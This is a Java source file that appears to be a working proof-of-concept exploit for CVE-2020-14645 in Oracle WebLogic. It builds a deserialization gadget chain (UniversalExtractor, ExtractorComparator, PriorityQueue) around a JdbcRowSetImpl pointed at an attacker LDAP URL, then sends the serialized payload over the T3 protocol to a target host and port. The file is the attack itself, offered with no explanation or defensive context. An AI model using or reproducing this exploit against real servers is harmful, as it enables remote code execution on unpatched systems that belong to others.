package com.supeream;

import com.sun.rowset.JdbcRowSetImpl;
import com.supeream.serial.Reflections;
import com.supeream.serial.Serializables;
import com.supeream.weblogic.T3ProtocolOperation;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.UniversalExtractor;

import java.util.PriorityQueue;

public class CVE_2020_14645 {
    public static void main(String[] args) throws Exception {
        // CVE_2020_14645
        UniversalExtractor extractor = new UniversalExtractor("getDatabaseMetaData()", null, 1);
        final ExtractorComparator comparator = new ExtractorComparator(extractor);

        JdbcRowSetImpl rowSet = new JdbcRowSetImpl();
        rowSet.setDataSourceName("ldap://172.16.2.1:1389/#Calc");
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);

        Object[] q = new Object[]{rowSet, rowSet};
        Reflections.setFieldValue(queue, "queue", q);
        Reflections.setFieldValue(queue, "size", 2);
        byte[] payload = Serializables.serialize(queue);
        T3ProtocolOperation.send("172.16.2.132", "7001", payload);
    }
}
